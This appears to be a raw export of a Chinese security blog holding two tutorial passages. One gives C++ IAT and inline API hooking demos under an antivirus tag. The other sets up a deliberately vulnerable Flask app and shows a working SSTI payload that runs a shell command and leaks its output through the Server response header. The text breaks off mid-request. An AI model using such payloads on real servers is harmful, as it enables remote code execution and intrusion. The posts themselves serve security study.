class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">DWORD pOldFuncAddr = (DWORD)::GetProcAddress(LoadLibrary(<span class="string">L&quot;USER32.dll&quot;</span>), <span class="string">&quot;MessageBoxW&quot;</span>);</span><br><span class="line"></span><br><span class="line">BOOL <span class="title function_">SetIATHook</span><span class="params">(DWORD dwOldAddr, DWORD dwNewAddr)</span> &#123;</span><br><span class="line">    DWORD dwImageBase = <span class="number">0</span>;</span><br><span class="line">    PIMAGE_DOS_HEADER pDosHeader;</span><br><span class="line">    PIMAGE_NT_HEADERS pNTHeader = <span class="literal">NULL</span>;</span><br><span class="line">    PIMAGE_FILE_HEADER pPEHeader = <span class="literal">NULL</span>;</span><br><span class="line">    PIMAGE_OPTIONAL_HEADER32 pOptionHeader = <span class="literal">NULL</span>;</span><br><span class="line">    PIMAGE_SECTION_HEADER pSectionHeader = <span class="literal">NULL</span>;</span><br><span class="line">    PIMAGE_IMPORT_DESCRIPTOR pImport = <span class="literal">NULL</span>;</span><br><span class="line">    PDWORD pIAT = <span class="literal">NULL</span>;</span><br><span class="line">    DWORD oldProtected = <span class="number">0</span>;</span><br><span class="line">    <span class="type">bool</span> Flag = FALSE;</span><br><span class="line"></span><br><span class="line">    dwImageBase = (DWORD)::GetModuleHandle(<span class="literal">NULL</span>);</span><br><span class="line">    pDosHeader = (PIMAGE_DOS_HEADER)dwImageBase;</span><br><span class="line">    pNTHeader = (PIMAGE_NT_HEADERS)((DWORD)pDosHeader + pDosHeader-&gt;e_lfanew);</span><br><span class="line">    pPEHeader = (PIMAGE_FILE_HEADER)((DWORD)pNTHeader + <span class="number">4</span>);</span><br><span class="line">    pOptionHeader = (PIMAGE_OPTIONAL_HEADER32)((DWORD)pPEHeader + IMAGE_SIZEOF_FILE_HEADER);</span><br><span class="line">    pImport = (PIMAGE_IMPORT_DESCRIPTOR)(pOptionHeader-&gt;DataDirectory[<span class="number">1</span>].VirtualAddress + dwImageBase);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//定位IAT表</span></span><br><span class="line">    <span class="keyword">while</span> (pImport-&gt;FirstThunk != <span class="number">0</span> &amp;&amp; Flag == FALSE) &#123;</span><br><span class="line">        pIAT = (PDWORD)(pImport-&gt;FirstThunk + dwImageBase);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (*pIAT) &#123;</span><br><span class="line">            <span class="keyword">if</span> (*pIAT == pOldFuncAddr) &#123;</span><br><span class="line">                VirtualProtect(pIAT, <span class="number">0x4096</span>, PAGE_EXECUTE_READWRITE, &amp;oldProtected);</span><br><span class="line">                *pIAT = dwNewAddr;</span><br><span class="line">                Flag = TRUE;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Hook Success!\n\n&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            pIAT++;</span><br><span class="line">        &#125;</span><br><span class="line">        pImport++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> Flag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DWORD <span class="title function_">UnSetIATHook</span><span class="params">(DWORD dwOldAddr, DWORD dwNewAddr)</span> &#123;</span><br><span class="line">    DWORD dwImageBase = <span class="number">0</span>;</span><br><span class="line">    PIMAGE_DOS_HEADER pDosHeader;</span><br><span class="line">    PIMAGE_NT_HEADERS pNTHeader = <span class="literal">NULL</span>;</span><br><span class="line">    PIMAGE_FILE_HEADER pPEHeader = <span class="literal">NULL</span>;</span><br><span class="line">    PIMAGE_OPTIONAL_HEADER32 pOptionHeader = <span class="literal">NULL</span>;</span><br><span class="line">    PIMAGE_SECTION_HEADER pSectionHeader = <span class="literal">NULL</span>;</span><br><span class="line">    PIMAGE_IMPORT_DESCRIPTOR pImport = <span class="literal">NULL</span>;</span><br><span class="line">    PDWORD pIAT = <span class="literal">NULL</span>;</span><br><span class="line">    DWORD oldProtected = <span class="number">0</span>;</span><br><span class="line">    <span class="type">bool</span> Flag = FALSE;</span><br><span class="line"></span><br><span class="line">    dwImageBase = (DWORD)::GetModuleHandle(<span class="literal">NULL</span>);   <span class="comment">// 获取进程基址</span></span><br><span class="line">    pDosHeader = (PIMAGE_DOS_HEADER)dwImageBase;</span><br><span class="line">    pNTHeader = (PIMAGE_NT_HEADERS)((DWORD)pDosHeader + pDosHeader-&gt;e_lfanew);</span><br><span class="line">    pPEHeader = (PIMAGE_FILE_HEADER)((DWORD)pNTHeader + <span class="number">4</span>);</span><br><span class="line">    pOptionHeader = (PIMAGE_OPTIONAL_HEADER32)((DWORD)pPEHeader + IMAGE_SIZEOF_FILE_HEADER);</span><br><span class="line">    pImport = (PIMAGE_IMPORT_DESCRIPTOR)(pOptionHeader-&gt;DataDirectory[<span class="number">1</span>].VirtualAddress + dwImageBase);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (pImport-&gt;FirstThunk != <span class="number">0</span> &amp;&amp; Flag == FALSE) &#123;</span><br><span class="line">        pIAT = (PDWORD)(pImport-&gt;FirstThunk + dwImageBase);</span><br><span class="line">        <span class="keyword">while</span> (*pIAT) &#123;</span><br><span class="line">            <span class="keyword">if</span> (*pIAT == dwNewAddr) &#123;</span><br><span class="line">                *pIAT = dwOldAddr;</span><br><span class="line">                Flag = TRUE;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            pIAT;</span><br><span class="line">        &#125;</span><br><span class="line">        pImport;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> Flag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> WINAPI <span class="title function_">EvilMessageBox</span><span class="params">(</span></span><br><span class="line"><span class="params">    HWND hwnd,</span></span><br><span class="line"><span class="params">    LPCSTR lpText,</span></span><br><span class="line"><span class="params">    LPCSTR lpCaption,</span></span><br><span class="line"><span class="params">    UINT uType)</span> &#123;</span><br><span class="line">    <span class="comment">//定义MyMessageBox的指针</span></span><br><span class="line">    <span class="keyword">typedef</span> <span class="title function_">int</span> <span class="params">(WINAPI* PFNMESSAGEBOX)</span><span class="params">(HWND, LPCSTR, LPCSTR, UINT)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取参数</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Argument: hwnd-%x lpText-%ws lpCaption-%ws uType-%x\n\n&quot;</span>, hwnd, lpText, lpCaption, uType);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//执行真正的函数</span></span><br><span class="line">    <span class="type">int</span> ret = ((PFNMESSAGEBOX)pOldFuncAddr)(hwnd, lpText, lpCaption, uType);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取返回值</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The return value is: %x\n\n&quot;</span>, ret);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">EvilIATHook</span><span class="params">()</span> &#123;</span><br><span class="line">    MessageBox(<span class="literal">NULL</span>, <span class="string">L&quot;Before IAT HOOK&quot;</span>, <span class="string">L&quot;HOOK!&quot;</span>, MB_OK);</span><br><span class="line">    SetIATHook(pOldFuncAddr, (DWORD)EvilMessageBox);</span><br><span class="line">    MessageBox(<span class="literal">NULL</span>, <span class="string">L&quot;IAT HOOK&quot;</span>, <span class="string">L&quot;IATHOOK Success!&quot;</span>, MB_OK);</span><br><span class="line">    UnSetIATHook(pOldFuncAddr, (DWORD)EvilMessageBox);</span><br><span class="line">    MessageBox(<span class="literal">NULL</span>, <span class="string">L&quot;After IAT HOOK&quot;</span>, <span class="string">L&quot;HOOK!&quot;</span>, MB_OK);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    EvilIATHook();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/10/20/Hook/1729070496355-269d7966-f520-441f-8060-e0f57a5eae74.png"></p><h3 id="Inline-Hook"><a href="#Inline-Hook" class="headerlink" title="Inline Hook"></a>Inline Hook</h3><h4 id="基本概念-2"><a href="#基本概念-2" class="headerlink" title="基本概念"></a>基本概念</h4><p><font style="color:#000000;">Inline Hook又被称为内联Hook，主要思想是直接修改目标API函数的代码</font></p><h4 id="实现方式-1"><a href="#实现方式-1" class="headerlink" title="实现方式"></a>实现方式</h4><ol><li><font style="color:#000000;">使用E9（JMP）进行InlineHook</font></li></ol><p><font style="color:#000000;">E9是JMP指令的操作码，用于进行近跳转。它后面跟随一个相对偏移，表示从当前指令后的下一个指令开始计算的跳转目标。</font></p><p><font style="color:#000000;">当使用E9进行InlineHook时，直接在目标函数的入口插入一个跳转指令，使其跳转到Hook函数。例如，E9 [offset]，其中[offset]是从JMP指令后的下一个指令到Hook函数的相对偏移（相对偏移 &#x3D; 目的地址 - 源地址 - 5）。其中，5是jmp指令的字节数。</font></p><ol start="2"><li><font style="color:#000000;">使用B8（MOV）和FF E0（JMP EAX）进行InlineHook</font></li></ol><p><font style="color:#000000;">B8是MOV指令的操作码，用于将一个立即数值移动到EAX寄存器。FF E0是JMP EAX指令的操作码，表示跳转到EAX寄存器中的地址。</font></p><p><font style="color:#000000;">当使用这种方法进行InlineHook时，首先将Hook函数的地址移动到EAX寄存器，然后使用JMP EAX跳转到该地址。例如，B8 [hook function address] FF E0，其中[hook function address]是Hook函数的绝对地址（即目标地址）。</font></p><h4 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(_WIN64)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ORIG_BYTES_SIZE 14</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ORIG_BYTES_SIZE 7</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Save some of the original code bytes of MessageBoxA</span></span><br><span class="line">BYTE OriginalBytes[ORIG_BYTES_SIZE]&#123;&#125;;</span><br><span class="line"><span class="comment">// Construct jump instruction</span></span><br><span class="line">BYTE PatchBytes[ORIG_BYTES_SIZE]&#123;&#125;;</span><br><span class="line"></span><br><span class="line">using MessageBoxAT = <span class="type">int</span> (WINAPI*)(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType);</span><br><span class="line">MessageBoxAT OriginalMessageBox = nullptr;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> WINAPI <span class="title function_">HookMessageBoxA</span><span class="params">(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType)</span> &#123;</span><br><span class="line"><span class="comment">// Execute custom code</span></span><br><span class="line">SIZE_T bytesOut = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">MessageBoxW(<span class="number">0</span>, <span class="string">L&quot;HookedMessageBox() called&quot;</span>, <span class="string">L&quot;Inline Hook&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// unpatch MessageBoxA</span></span><br><span class="line">WriteProcessMemory(GetCurrentProcess(), (LPVOID)OriginalMessageBox, OriginalBytes, <span class="keyword">sizeof</span>(OriginalBytes), &amp;bytesOut);</span><br><span class="line"><span class="comment">// call MessageBoxA</span></span><br><span class="line"><span class="type">int</span> result = MessageBoxA(<span class="literal">NULL</span>, lpText, lpCaption, uType);</span><br><span class="line"><span class="comment">// patch MessageBoxA</span></span><br><span class="line">WriteProcessMemory(GetCurrentProcess(), OriginalMessageBox, PatchBytes, <span class="keyword">sizeof</span>(PatchBytes), &amp;bytesOut);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">SetHook</span><span class="params">(<span class="built_in">std</span>::<span class="built_in">string</span> dllName, <span class="built_in">std</span>::<span class="built_in">string</span> origFunc, FARPROC hookingFunc)</span> &#123;</span><br><span class="line">SIZE_T bytesIn = <span class="number">0</span>;</span><br><span class="line">SIZE_T bytesOut = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Save MessageBoxA original address</span></span><br><span class="line">OriginalMessageBox = (MessageBoxAT)GetProcAddress(GetModuleHandleA(dllName.c_str()), origFunc.c_str());</span><br><span class="line"></span><br><span class="line"><span class="comment">// Save some of the original code bytes of MessageBoxA</span></span><br><span class="line">ReadProcessMemory(GetCurrentProcess(), OriginalMessageBox, OriginalBytes, ORIG_BYTES_SIZE, &amp;bytesIn);</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(PatchBytes, <span class="number">0</span>, <span class="keyword">sizeof</span>(PatchBytes));</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(_WIN64)</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">JMP [RIP+0];</span></span><br><span class="line"><span class="comment">\xFF\x25\x00\x00\x00\x00</span></span><br><span class="line"><span class="comment">\x00\x11\x22\x33\x44\0x55\x66\x77</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="built_in">memcpy</span>(PatchBytes, <span class="string">&quot;\xFF\x25&quot;</span>, <span class="number">2</span>);</span><br><span class="line"><span class="built_in">memcpy</span>(PatchBytes + <span class="number">6</span>, &amp;hookingFunc, <span class="number">8</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">mov eax, &amp;hookingFunc</span></span><br><span class="line"><span class="comment">jmp eax</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="built_in">memcpy</span>(PatchBytes, <span class="string">&quot;\xB8&quot;</span>, <span class="number">1</span>);</span><br><span class="line"><span class="built_in">memcpy</span>(PatchBytes + <span class="number">1</span>, &amp;hookingFunc, <span class="keyword">sizeof</span>(ULONG_PTR));</span><br><span class="line"><span class="built_in">memcpy</span>(PatchBytes + <span class="number">5</span>, <span class="string">&quot;\xFF\xE0&quot;</span>, <span class="number">2</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// patch the MessageBoxA</span></span><br><span class="line">WriteProcessMemory(GetCurrentProcess(), OriginalMessageBox, PatchBytes, <span class="keyword">sizeof</span>(PatchBytes), &amp;bytesOut);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="comment">// Before Hook</span></span><br><span class="line">MessageBoxA(<span class="number">0</span>, <span class="string">&quot;Before Hooking&quot;</span>, <span class="string">&quot;Inline Hook&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Inline Hook</span></span><br><span class="line">SetHook(<span class="string">&quot;user32.dll&quot;</span>, <span class="string">&quot;MessageBoxA&quot;</span>, (FARPROC)HookMessageBoxA);</span><br><span class="line"></span><br><span class="line"><span class="comment">// After Hook</span></span><br><span class="line">MessageBoxA(<span class="number">0</span>, <span class="string">&quot;After Hooking&quot;</span>, <span class="string">&quot;Inline Hook&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/10/20/Hook/1729425891866-f864fa9f-5b4c-4f0f-a394-148939d10064.png"></p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://pentest.blog/offensive-iat-hooking/">Offensive IAT Hooking</a></p><p><a href="https://mp.weixin.qq.com/s/wE56FotXCIPXj2OjdRmmSg">安全开发之应用层Hook技术</a></p>]]></content>
      
      
      <categories>
          
          <category> Antivirus </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hook </tag>
            
            <tag> Antivirus </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>巧用请求头回显SSTI命令执行结果</title>
      <link href="/2024/10/17/%E5%B7%A7%E7%94%A8%E8%AF%B7%E6%B1%82%E5%A4%B4%E5%9B%9E%E6%98%BESSTI%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%93%E6%9E%9C/"/>
      <url>/2024/10/17/%E5%B7%A7%E7%94%A8%E8%AF%B7%E6%B1%82%E5%A4%B4%E5%9B%9E%E6%98%BESSTI%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%93%E6%9E%9C/</url>
      
        <content type="html"><![CDATA[<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## -*-coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">template</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        args = request.form.get(<span class="string">&#x27;code&#x27;</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment">## 尝试渲染模板字符串</span></span><br><span class="line">            result = render_template_string(args)</span><br><span class="line">            <span class="built_in">print</span>(result)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;OK&quot;</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="comment">## 如果渲染失败，打印错误信息并返回错误响应</span></span><br><span class="line">            <span class="built_in">print</span>(e)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Error rendering template&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Please submit a POST request with &#x27;code&#x27; parameter.&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>, host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8000</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>注意到在Python搭建的Flask应用中，返回包中会存在Server相关的信息，而对于Werkzeug和Python的版本号肯定是通过某种处理方式写入了返回包的请求头中。</p><p><img src="/2024/10/17/%E5%B7%A7%E7%94%A8%E8%AF%B7%E6%B1%82%E5%A4%B4%E5%9B%9E%E6%98%BESSTI%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%93%E6%9E%9C/1728722114484-fbc92769-c629-4427-84b3-35ff374a113f.png"></p><p>编写一个Flask-Demo，在app.run处下断点看看运行的逻辑，开始部分都是环境相关的判断，接着判断是否开启Debug模式，处理Host和Port等信息。</p><p><img src="/2024/10/17/%E5%B7%A7%E7%94%A8%E8%AF%B7%E6%B1%82%E5%A4%B4%E5%9B%9E%E6%98%BESSTI%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%93%E6%9E%9C/1728722375653-b9174a21-93e9-415f-8877-43d0839886f4.png"></p><p><img src="/2024/10/17/%E5%B7%A7%E7%94%A8%E8%AF%B7%E6%B1%82%E5%A4%B4%E5%9B%9E%E6%98%BESSTI%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%93%E6%9E%9C/1728722441287-62b5f6d3-0aa2-4cbd-bd0f-8ff57d09c4de.png"></p><p>继续往下，会发现往options中添加了三个字段值，其中use_reloader和use_debugger的值是通过是否开启Debug模式来设置的，threaded则默认是TRUE。</p><p>接着，调用Werkzeug库启动一个WSGI服务器来运行Flask应用，并把Host、Port以及options等作为参数传入。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">options.setdefault(<span class="string">&quot;use_reloader&quot;</span>, <span class="variable language_">self</span>.debug)</span><br><span class="line">options.setdefault(<span class="string">&quot;use_debugger&quot;</span>, <span class="variable language_">self</span>.debug)</span><br><span class="line">options.setdefault(<span class="string">&quot;threaded&quot;</span>, <span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p><img src="/2024/10/17/%E5%B7%A7%E7%94%A8%E8%AF%B7%E6%B1%82%E5%A4%B4%E5%9B%9E%E6%98%BESSTI%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%93%E6%9E%9C/1728723000754-9dcb0079-e738-4c5c-8ea2-1b4bad171179.png"></p><p>跟进serving#run_simple函数中，依旧还是先进行一些环境、Debug模型的判断。接着调用make_server方法来创建一个WSGI服务器，并且默认是ThreadedWSGIServer。</p><p><img src="/2024/10/17/%E5%B7%A7%E7%94%A8%E8%AF%B7%E6%B1%82%E5%A4%B4%E5%9B%9E%E6%98%BESSTI%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%93%E6%9E%9C/1728723344882-e6d484bc-a8db-4b94-83e9-3d606f4d1af0.png"></p><p><img src="/2024/10/17/%E5%B7%A7%E7%94%A8%E8%AF%B7%E6%B1%82%E5%A4%B4%E5%9B%9E%E6%98%BESSTI%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%93%E6%9E%9C/1728723294877-580cee8e-f299-407c-915e-4aaeb2b11911.png"></p><p>此时已经知道了开启的Server类型，接着跟进Handler处理逻辑，在WSGIRequestHandler类中，在write方法中，通过for循环来将请求头键值对利用send_header方法进行设置。</p><p><img src="/2024/10/17/%E5%B7%A7%E7%94%A8%E8%AF%B7%E6%B1%82%E5%A4%B4%E5%9B%9E%E6%98%BESSTI%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%93%E6%9E%9C/1728724226859-76be49b4-294a-47ef-acef-89e6c67f65d2.png"></p><p>跟进send_header方法并下断点，可以看到第一次调用send_header方法的就是设置Server头，跟进调用栈send_response方法，可以看到对Server和Date头的设置。</p><p><img src="/2024/10/17/%E5%B7%A7%E7%94%A8%E8%AF%B7%E6%B1%82%E5%A4%B4%E5%9B%9E%E6%98%BESSTI%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%93%E6%9E%9C/1728724617102-407a59ca-b93d-426f-800c-da86f33534af.png"></p><p><img src="/2024/10/17/%E5%B7%A7%E7%94%A8%E8%AF%B7%E6%B1%82%E5%A4%B4%E5%9B%9E%E6%98%BESSTI%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%93%E6%9E%9C/1728724736111-dc4bac48-7038-409c-a4f4-55644da5264c.png"></p><p>跟进version_string方法，可以看到这里是将server_version属性和sys_version属性直接做的拼接。</p><p><img src="/2024/10/17/%E5%B7%A7%E7%94%A8%E8%AF%B7%E6%B1%82%E5%A4%B4%E5%9B%9E%E6%98%BESSTI%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%93%E6%9E%9C/1728724776918-6c430ebd-93fb-4e9c-acc9-bf6111bfc57b.png"></p><p>由于server_version和sys_version是以属性形式存在类中，那么就可以利用一些赋值方法来将代码或是命令执行的回显存放在这个属性中，从而结合send_header方法实现回显外带。</p><p>这里可以直接对父类BaseHTTPRequestHandler中的sys_version字段值进行修改即可。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.0.115:8000</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36</span><br><span class="line"></span><br><span class="line"><span class="language-stylus">code=&#123;&#123;<span class="selector-tag">g</span><span class="selector-class">.pop</span>.__globals__.__builtins__<span class="selector-class">.setattr</span>(<span class="selector-tag">g</span><span class="selector-class">.pop</span>.__globals__<span class="selector-class">.sys</span><span class="selector-class">.modules</span><span class="selector-class">.http</span><span class="selector-class">.server</span><span class="selector-class">.BaseHTTPRequestHandler</span>,<span class="string">&quot;sys_version&quot;</span>,<span class="selector-tag">g</span><span class="selector-class">.pop</span>.__globals__.__builtins__.<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>)<span class="selector-class">.popen</span>(<span class="string">&#x27;whoami&#x27;</span>)<span class="selector-class">.read</span>())&#125;&#125;</span></span><br></pre></td></tr></table></figure><p><img src="/2024/10/17/%E5%B7%A7%E7%94%A8%E8%AF%B7%E6%B1%82%E5%A4%B4%E5%9B%9E%E6%98%BESSTI%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%93%E6%9E%9C/1728725527229-0be52039-4fc4-47dd-9701-d99d70fe34ca.png"></p><p><img src="/2024/10/17/%E5%B7%A7%E7%94%A8%E8%AF%B7%E6%B1%82%E5%A4%B4%E5%9B%9E%E6%98%BESSTI%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%93%E6%9E%9C/1728725517374-845c6378-30c9-4589-ba1f-9e65f889b3c1.png"></p><p>对于server_version的修改，可以修改WSGIRequestHandler类的server_version方法，该方法前存在装饰器@property，它把方法包装成属性，让方法可以以属性的形式被访问和调用，即此时server_version方法等同于self.server_version&#x3D;self.server._server_version。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.0.115:8000</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 